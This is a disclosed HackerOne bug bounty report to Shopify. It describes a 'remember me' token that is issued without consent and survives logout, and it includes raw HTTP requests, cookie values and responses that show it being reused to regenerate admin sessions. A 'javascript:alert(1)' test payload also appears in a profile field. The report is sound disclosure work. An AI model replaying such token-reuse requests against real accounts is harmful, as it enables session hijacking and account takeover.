@@ -1,0 +1,105 @@
+ReportLink:https://hackerone.com/reports/105991
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/dhaval
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:13.01.2016 1:52:49
+
+Summary:
+A "remember me" token (`user_auth_token`) was generated even when the "Remember me" box at the login page (https://www.shopify.com/login) was not checked, which could result in a longer-lasting session than the user intended.
+Hi,
+
+This is a weird behaviour which regenerates `_secure_admin_session_id` cookie
+
+Steps to Reproduce :
+1. Navigate to `https://www.shopify.com/login`
+2. Enter credentials
+3. Enter two factor code from authenticator
+
+Check cookie, There should be cookie named `user_auth_token`. I believe this token is auto-generated because simply logging into the account creates it
+
+Now we would leverage `https://dr4cun0-2.myshopify.com/admin/users.json` for re-generating the `_secure_admin_session_id` and validating the bug
+
+This is a sample request :
+
+`GET /admin/users.json HTTP/1.1
+Host: dr4cun0-2.myshopify.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: user_auth_token=49a2919e2ae9e22ca4ead68d71fbb5df; 
+Connection: keep-alive`
+
+Response :
+`HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 18 Dec 2015 21:02:00 GMT
+Content-Type: application/json; charset=utf-8
+Connection: keep-alive
+Vary: Accept-Encoding
+Status: 200 OK
+X-Frame-Options: DENY
+X-ShopId: 8256817
+X-ShardId: 6
+X-Stats-UserId: 7640917
+X-XSS-Protection: 1; mode=block; report=/xss-report/a6f1fcdb-fdaf-47e3-880e-b1c584f3cbf1?source%5Baction%5D=index&source%5Bcontroller%5D=admin%2Fusers&source%5Bsection%5D=admin
+Set-Cookie: _secure_admin_session_id=7c76c5ad72f389c4d5989f7634cdbb5a; path=/admin; secure; HttpOnly
+X-Request-Id: a6f1fcdb-fdaf-47e3-880e-b1c584f3cbf1
+P3P: CP="NOI DSP COR NID ADMa OPTa OUR NOR"
+X-Dc: ash
+X-Content-Type-Options: nosniff
+Content-Length: 338`
+
+`{"users":[{"id":7640917,"first_name":"Dhaval","email":"dhruvchauhan1711@gmail.com","url":"http:\/\/javascript:\/\/alert(1)\/\/","im":null,"screen_name":null,"phone":"","last_name":"Chauhan","account_owner":true,"receive_announcements":1,"bio":"","permissions":["full"],"user_type":"regular","phone_validated?":false,"tfa_enabled?":true}]}`
+
+Notice : `Set-Cookie: _secure_admin_session_id=7c76c5ad72f389c4d5989f7634cdbb5a; path=/admin; secure; HttpOnly`
+
+This should be different that the one in the browser
+
+Issue :
+* Now logout in the browser
+
+Try Request :
+`GET /admin/users.json HTTP/1.1
+Host: dr4cun0-2.myshopify.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: _secure_admin_session_id=7c76c5ad72f389c4d5989f7634cdbb5a; user_auth_token=49a2919e2ae9e22ca4ead68d71fbb5df; 
+Connection: keep-alive`
+
+Response :
+`HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 18 Dec 2015 21:10:43 GMT
+Content-Type: application/json; charset=utf-8
+Connection: keep-alive
+Vary: Accept-Encoding
+Status: 200 OK
+X-Frame-Options: DENY
+X-ShopId: 8256817
+X-ShardId: 6
+X-Stats-UserId: 7640917
+X-XSS-Protection: 1; mode=block; report=/xss-report/1274b8cc-c272-48d4-869b-c87f3e939554?source%5Baction%5D=index&source%5Bcontroller%5D=admin%2Fusers&source%5Bsection%5D=admin
+X-Request-Id: 1274b8cc-c272-48d4-869b-c87f3e939554
+P3P: CP="NOI DSP COR NID ADMa OPTa OUR NOR"
+X-Dc: ash
+X-Content-Type-Options: nosniff
+Content-Length: 338`
+
+`{"users":[{"id":7640917,"first_name":"Dhaval","email":"dhruvchauhan1711@gmail.com","url":"http:\/\/javascript:\/\/alert(1)\/\/","im":null,"screen_name":null,"phone":"","last_name":"Chauhan","account_owner":true,"receive_announcements":1,"bio":"","permissions":["full"],"user_type":"regular","phone_validated?":false,"tfa_enabled?":true}]}`
+
+So keeping the same auto-generated `user_auth_token` and new `_secure_admin_session_id`
+we can access the previous session in the browser as well
+
+Issue :
+
+* Auto generated token not being expired after logout
+* Leveraging `users.json` to re-generate token which does not expire at logout as well
+ 
+Technically 
+Once obtain a `user_auth_token` and get full access to the users account. Also you get the unlimited access because logout from victim side does not affect the new session nor the `user_auth_token`
